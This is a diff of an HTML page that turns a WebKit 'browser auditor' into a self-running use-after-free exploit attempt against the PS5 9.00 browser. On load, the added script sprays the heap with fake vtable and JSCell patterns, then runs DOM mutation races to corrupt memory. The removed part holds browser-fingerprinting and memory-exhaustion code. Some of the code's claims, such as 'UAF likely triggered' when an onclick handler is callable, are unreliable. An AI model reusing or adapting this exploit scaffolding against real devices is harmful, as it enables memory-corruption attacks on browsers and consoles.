@@ -1,508 +1,124 @@
 <!DOCTYPE html>
-<html lang="fr">
+<html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>WebKit Browser Auditor</title>
+  <title>UAF Vulnerability Scanner - WebKit</title>
   <style>
-    :root {
-      --primary-color: #2c3e50;
-      --secondary-color: #34495e;
-      --accent-color: #3498db;
-      --danger-color: #e74c3c;
-      --success-color: #2ecc71;
-      --text-color: #ecf0f1;
-      --light-text: #bdc3c7;
-      --dark-bg: #1a1a1a;
-    }
-    
     body {
-      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-      margin: 0;
-      padding: 0;
-      background-color: var(--dark-bg);
-      color: var(--text-color);
-    }
-    
-    .container {
-      max-width: 1200px;
-      margin: 0 auto;
+      background-color: #111;
+      color: #0f0;
+      font-family: monospace;
       padding: 20px;
     }
-    
-    header {
-      text-align: center;
-      margin-bottom: 30px;
-      padding-bottom: 20px;
-      border-bottom: 1px solid var(--secondary-color);
-    }
-    
     h1 {
-      color: var(--accent-color);
-      margin-bottom: 10px;
+      font-size: 1.5em;
+      color: #90ee90;
     }
-    
-    .tab-container {
-      display: flex;
-      margin-bottom: -1px;
-    }
-    
-    .tab-btn {
-      padding: 12px 24px;
-      background-color: var(--secondary-color);
-      border: none;
-      border-radius: 5px 5px 0 0;
-      color: var(--text-color);
-      cursor: pointer;
-      margin-right: 5px;
-      font-weight: bold;
-      transition: all 0.3s ease;
-    }
-    
-    .tab-btn:hover {
-      background-color: var(--accent-color);
-    }
-    
-    .tab-btn.active {
-      background-color: var(--primary-color);
-      border-bottom: 3px solid var(--accent-color);
-    }
-    
-    .tab-content {
-      display: none;
-      background-color: var(--primary-color);
-      padding: 25px;
-      border-radius: 0 5px 5px 5px;
-      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
-    }
-    
-    .tab-content.active {
-      display: block;
-      animation: fadeIn 0.5s;
-    }
-    
-    @keyframes fadeIn {
-      from { opacity: 0; }
-      to { opacity: 1; }
-    }
-    
-    .btn {
-      padding: 12px 24px;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-      font-weight: bold;
-      transition: all 0.3s ease;
-      margin-right: 10px;
-      margin-bottom: 10px;
-    }
-    
-    .btn-primary {
-      background-color: var(--accent-color);
-      color: white;
-    }
-    
-    .btn-primary:hover {
-      background-color: #2980b9;
-    }
-    
-    .btn-danger {
-      background-color: var(--danger-color);
-      color: white;
-    }
-    
-    .btn-danger:hover {
-      background-color: #c0392b;
-    }
-    
-    .btn-success {
-      background-color: var(--success-color);
-      color: white;
-    }
-    
-    .btn-success:hover {
-      background-color: #27ae60;
-    }
-    
-    .log-container {
-      background-color: #000;
-      border: 1px solid var(--secondary-color);
-      border-radius: 5px;
-      padding: 15px;
-      margin-top: 20px;
-      font-family: 'Courier New', monospace;
-      color: white;
-      height: 300px;
-      overflow-y: auto;
+    #log {
       white-space: pre-wrap;
-    }
-    
-    .status-indicator {
-      display: inline-block;
-      width: 12px;
-      height: 12px;
-      border-radius: 50%;
-      margin-right: 8px;
-    }
-    
-    .status-ready {
-      background-color: var(--success-color);
-    }
-    
-    .status-running {
-      background-color: #f39c12;
-      animation: pulse 1.5s infinite;
-    }
-    
-    .status-error {
-      background-color: var(--danger-color);
-    }
-    
-    @keyframes pulse {
-      0% { opacity: 1; }
-      50% { opacity: 0.5; }
-      100% { opacity: 1; }
-    }
-    
-    .progress-container {
-      width: 100%;
-      background-color: var(--secondary-color);
-      border-radius: 5px;
-      margin: 15px 0;
-    }
-    
-    .progress-bar {
-      height: 20px;
-      background-color: var(--accent-color);
-      border-radius: 5px;
-      width: 0%;
-      transition: width 0.3s ease;
-    }
-    
-    .section-title {
-      display: flex;
-      align-items: center;
-      margin-bottom: 15px;
-    }
-    
-    .section-title h2 {
-      margin: 0;
-      color: var(--accent-color);
+      background: #000;
+      border: 1px solid #444;
+      padding: 12px;
+      max-height: 85vh;
+      overflow-y: auto;
     }
   </style>
 </head>
 <body>
-  <div class="container">
-    <header>
-      <h1>WebKit exploit</h1>
-      <p>Vulnerability Scanning</p>
-    </header>
-    
-    <div class="tab-container">
-      <button class="tab-btn active" onclick="openTab('system-info')">System Information</button>
-      <button class="tab-btn" onclick="openTab('memory-test')">Memory Test + UAF</button>
-      <button class="tab-btn" onclick="openTab('oom-test')">OOM/UAF Test</button>
-    </div>
-    
-    <!-- System Information Tab -->
-    <div id="system-info" class="tab-content active">
-      <div class="section-title">
-        <div class="status-indicator status-ready"></div>
-        <h2>System Information</h2>
-      </div>
-      <p>Collection of system information and browser configuration.</p>
-      <button class="btn btn-primary" onclick="collectSystemInfo()">Collect Information</button>
-      <button class="btn btn-danger" onclick="clearSystemInfo()">Clear</button>
-      <div id="system-info-log" class="log-container">Ready to collect system information...</div>
-    </div>
-    
-    <!-- Memory Test + UAF Tab -->
-    <div id="memory-test" class="tab-content">
-      <div class="section-title">
-        <div id="memory-status" class="status-indicator status-ready"></div>
-        <h2>Memory Stress Test + UAF Primitive</h2>
-      </div>
-      <p>Memory stress test with Use-After-Free detection.</p>
-      <button class="btn btn-primary" onclick="startMemoryTest()">Start Test</button>
-      <button class="btn btn-danger" onclick="stopMemoryTest()">Stop Test</button>
-      <button class="btn btn-danger" onclick="resetMemoryTest()">Reset</button>
-      
-      <div class="progress-container">
-        <div id="memory-progress" class="progress-bar"></div>
-      </div>
-      
-      <div id="memory-test-log" class="log-container">Memory test ready. Click "Start Test" to begin.</div>
-    </div>
-    
-    <!-- OOM/UAF Test Tab -->
-    <div id="oom-test" class="tab-content">
-      <div class="section-title">
-        <div id="oom-status" class="status-indicator status-ready"></div>
-        <h2>OOM/UAF Exploit Test</h2>
-      </div>
-      <p>Exploitation testing of OOM (Out Of Memory) and UAF (Use-After-Free) vulnerabilities.</p>
-      <button class="btn btn-primary" onclick="startOOMTest()">Start Exploit</button>
-      <button class="btn btn-danger" onclick="stopOOMTest()">Stop</button>
-      <button class="btn btn-danger" onclick="resetOOMTest()">Reset</button>
-      
-      <div class="progress-container">
-        <div id="oom-progress" class="progress-bar"></div>
-      </div>
-      
-      <div id="oom-test-log" class="log-container">OOM/UAF test ready. Click "Start Exploit" to begin.</div>
-    </div>
-  </div>
+  <h1>🧪 UAF Vulnerability Scanner (WebKit DOM) - PS5 9.00</h1>
+  <div id="log">[LOG START]\n</div>
 
   <script>
-    // Tab system
-    function openTab(tabId) {
-      const tabContents = document.getElementsByClassName('tab-content');
-      for (let i = 0; i < tabContents.length; i++) {
-        tabContents[i].classList.remove('active');
-      }
-      
-      const tabButtons = document.getElementsByClassName('tab-btn');
-      for (let i = 0; i < tabButtons.length; i++) {
-        tabButtons[i].classList.remove('active');
-      }
-      
-      document.getElementById(tabId).classList.add('active');
-      event.currentTarget.classList.add('active');
+    const spray = [];
+
+    function log(msg) {
+      const logBox = document.getElementById("log");
+      logBox.textContent += msg + "\n";
+      logBox.scrollTop = logBox.scrollHeight;
     }
-    
-    // System Information
-    function collectSystemInfo() {
-      const log = document.getElementById('system-info-log');
-      log.textContent = "Collecting system information...\n";
-      
+
+    function sprayCorruptPattern() {
+      log("[*] Spraying heap with controlled pattern for UAF testing...");
+
+      const pattern = new ArrayBuffer(0x100);
+      const u32 = new Uint32Array(pattern);
+
+      // Simulated vtable pointer (invalid to cause crash if used)
+      u32[0] = 0x41414141;
+      u32[1] = 0x41414141;
+
+      // Dummy entry or field
+      u32[2] = 0x42424242;
+      u32[3] = 0x42424242;
+
+      // JSCell flags
+      u32[4] = 0x01082007;
+
+      // Fill the rest with known pattern
+      for (let i = 5; i < u32.length; i++) {
+        u32[i] = 0x43434343;
+      }
+
+      for (let i = 0; i < 10000; i++) {
+        spray.push(new Float64Array(pattern.slice(0)));
+      }
+
+      log("[✓] Heap spray with fake JSFunction pattern completed.");
+    }
+
+    function triggerUAFObservation() {
       try {
-        const info = {
-          userAgent: navigator.userAgent,
-          platform: navigator.platform,
-          cpuCores: navigator.hardwareConcurrency,
-          deviceMemory: navigator.deviceMemory || "N/A",
-          language: navigator.language,
-          cookiesEnabled: navigator.cookieEnabled,
-          doNotTrack: navigator.doNotTrack,
-          webGL: getWebGLInfo(),
-          plugins: getPluginsInfo(),
-          connection: navigator.connection ? {
-            downlink: navigator.connection.downlink,
-            effectiveType: navigator.connection.effectiveType,
-            rtt: navigator.connection.rtt
-          } : "N/A"
-        };
-        
-        log.textContent += JSON.stringify(info, null, 2);
-      } catch (e) {
-        log.textContent += `Error collecting system info: ${e.message}`;
-      }
-    }
-    
-    function getWebGLInfo() {
-      const canvas = document.createElement('canvas');
-      const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-      if (!gl) return "WebGL not supported";
-      
-      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-      return {
-        vendor: debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : "N/A",
-        renderer: debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "N/A"
-      };
-    }
-    
-    function getPluginsInfo() {
-      return Array.from(navigator.plugins).map(plugin => ({
-        name: plugin.name,
-        filename: plugin.filename,
-        description: plugin.description
-      }));
-    }
-    
-    function clearSystemInfo() {
-      document.getElementById('system-info-log').textContent = "Ready to collect system information...";
-    }
-    
-    // Memory Test + UAF
-    let memoryTestRunning = false;
-    let memoryTestInterval;
-    
-    function startMemoryTest() {
-      if (memoryTestRunning) return;
-      
-      memoryTestRunning = true;
-      updateMemoryStatus('running');
-      const log = document.getElementById('memory-test-log');
-      log.textContent = "Starting memory test...\n";
-      
-      let buffers = [];
-      let str = "X".repeat(1000000);
-      let obj = {};
-      let pool = [];
-      let count = 0;
-      const maxCount = 2500;
-      
-      function triggerUAF() {
-        for (let i = 0; i < 1000; i++) {
-          let tmp = { x: "Z".repeat(1024) };
-          pool.push(tmp);
-        }
-        if (pool.length > 10000) pool = [];
-      }
-      
-      memoryTestInterval = setInterval(() => {
-        if (!memoryTestRunning) return;
-        
-        try {
-          buffers.push(new ArrayBuffer(512 * 1024));
-          str += str;
-          if (str.length > 100000000) str = "X".repeat(1000000);
-          
-          for (let i = 0; i < 100; i++) {
-            obj["key_" + Math.random()] = "Z".repeat(500);
-          }
-          
-          triggerUAF();
-          
-          count++;
-          const progress = Math.min(100, Math.floor((count / maxCount) * 100));
-          document.getElementById('memory-progress').style.width = `${progress}%`;
-          
-          log.textContent = `Memory Test Progress: ${count}/${maxCount} (${progress}%)\n`
-                         + `Dynamic Objects: ${Object.keys(obj).length}\n`
-                         + `Buffers Allocated: ${buffers.length}\n`
-                         + `UAF Pool Size: ${pool.length}\n`
-                         + `Current String Length: ${str.length}`;
-          
-          if (count >= maxCount) {
-            stopMemoryTest();
-            log.textContent += "\n\nTest completed successfully. Potential UAF triggered.";
-          }
-          
-          if (buffers.length > 2048) {
-            buffers = buffers.slice(-1024);
-          }
-        } catch (e) {
-          stopMemoryTest();
-          log.textContent += `\n\n[ERROR] ${e.message}`;
-          updateMemoryStatus('error');
-        }
-      }, 5);
-    }
-    
-    function stopMemoryTest() {
-      memoryTestRunning = false;
-      clearInterval(memoryTestInterval);
-      updateMemoryStatus(memoryTestRunning ? 'running' : 'ready');
-    }
-    
-    function resetMemoryTest() {
-      stopMemoryTest();
-      document.getElementById('memory-test-log').textContent = "Memory test ready. Click \"Start Test\" to begin.";
-      document.getElementById('memory-progress').style.width = "0%";
-      updateMemoryStatus('ready');
-    }
-    
-    function updateMemoryStatus(status) {
-      const indicator = document.getElementById('memory-status');
-      indicator.className = 'status-indicator';
-      
-      if (status === 'running') {
-        indicator.classList.add('status-running');
-      } else if (status === 'error') {
-        indicator.classList.add('status-error');
-      } else {
-        indicator.classList.add('status-ready');
-      }
-    }
-    
-    // OOM/UAF Test
-    let oomTestRunning = false;
-    let oomTestInterval;
-    
-    function startOOMTest() {
-      if (oomTestRunning) return;
-      
-      oomTestRunning = true;
-      updateOOMStatus('running');
-      const log = document.getElementById('oom-test-log');
-      log.textContent = "Starting OOM/UAF test...\n";
-      
-      const ALLOC_SIZE = 1024 * 1024 * 2;
-      const MAX_ALLOCATIONS = 150;
-      let allocations = [];
-      let uafDetected = false;
-      
-      function createUAFTarget() {
-        let target = new ArrayBuffer(ALLOC_SIZE);
-        let weakRef = new WeakRef(target);
-        target = null;
-        return weakRef;
-      }
-      
-      let weakRefs = [];
-      for (let i = 0; i < 20; i++) {
-        weakRefs.push(createUAFTarget());
-      }
-      
-      oomTestInterval = setInterval(() => {
-        if (!oomTestRunning) return;
-        
-        try {
-          let newAlloc = new Uint8Array(ALLOC_SIZE);
-          newAlloc.fill(0x41);
-          allocations.push(newAlloc);
-          
-          for (let ref of weakRefs) {
-            if (ref.deref() === undefined && !uafDetected) {
-              uafDetected = true;
-              log.textContent += "\n[SUCCESS] UAF detected!";
+        log("[*] Launching DOM mutation and corruption scenario...");
+
+        const target = document.createElement("div");
+        document.body.appendChild(target);
+
+        const observer = new MutationObserver(() => {
+          for (let i = 0; i < 1000; i++) {
+            const span = document.createElement("span");
+            span.textContent = "Race" + i;
+            target.appendChild(span);
+
+            if (i % 200 === 0) {
+              try {
+                const node = target.lastChild;
+                const clone = node.cloneNode();
+
+                if (typeof clone.onclick === "function") {
+                  log("[!!!] clone.onclick is callable — UAF likely triggered.");
+                  clone.onclick(); // May crash due to vtable being redirected
+                }
+
+                clone.remove(); // Remove to trigger memory release
+
+              } catch (e) {
+                log("[!] Exception during DOM access: " + e);
+              }
             }
           }
-          
-          const progress = Math.min(100, Math.floor((allocations.length / MAX_ALLOCATIONS) * 100));
-          document.getElementById('oom-progress').style.width = `${progress}%`;
-          
-          log.textContent = `Allocations: ${allocations.length}/${MAX_ALLOCATIONS} (${progress}%)\n`
-                         + `UAF Detected: ${uafDetected ? "YES" : "NO"}\n`
-                         + `Memory Used: ~${Math.round((allocations.length * ALLOC_SIZE) / (1024 * 1024))} MB`;
-          
-          if (allocations.length >= MAX_ALLOCATIONS || uafDetected) {
-            stopOOMTest();
-            log.textContent += "\n\nTest completed. Expected crash or UAF confirmed.";
+        });
+
+        observer.observe(target, { childList: true });
+
+        setTimeout(() => {
+          log("[*] Executing heavy DOM mutation...");
+          for (let i = 0; i < 20000; i++) {
+            const el = document.createElement("b");
+            el.textContent = "DOMFuzz" + i;
+            target.appendChild(el);
+            if (i % 4000 === 0) target.innerHTML = "";
           }
-        } catch (e) {
-          stopOOMTest();
-          log.textContent += `\n\n[ERROR] ${e.message}`;
-          updateOOMStatus('error');
-        }
-      }, 100);
-    }
-    
-    function stopOOMTest() {
-      oomTestRunning = false;
-      clearInterval(oomTestInterval);
-      updateOOMStatus(oomTestRunning ? 'running' : 'ready');
-    }
-    
-    function resetOOMTest() {
-      stopOOMTest();
-      document.getElementById('oom-test-log').textContent = "OOM/UAF test ready. Click \"Start Exploit\" to begin.";
-      document.getElementById('oom-progress').style.width = "0%";
-      updateOOMStatus('ready');
-    }
-    
-    function updateOOMStatus(status) {
-      const indicator = document.getElementById('oom-status');
-      indicator.className = 'status-indicator';
-      
-      if (status === 'running') {
-        indicator.classList.add('status-running');
-      } else if (status === 'error') {
-        indicator.classList.add('status-error');
-      } else {
-        indicator.classList.add('status-ready');
+          log("[✓] DOM mutation complete.");
+        }, 100);
+      } catch (e) {
+        log("[-] Fatal JavaScript error: " + e);
       }
     }
+
+    window.onload = () => {
+      sprayCorruptPattern();
+      triggerUAFObservation();
+    };
   </script>
 </body>
 </html>
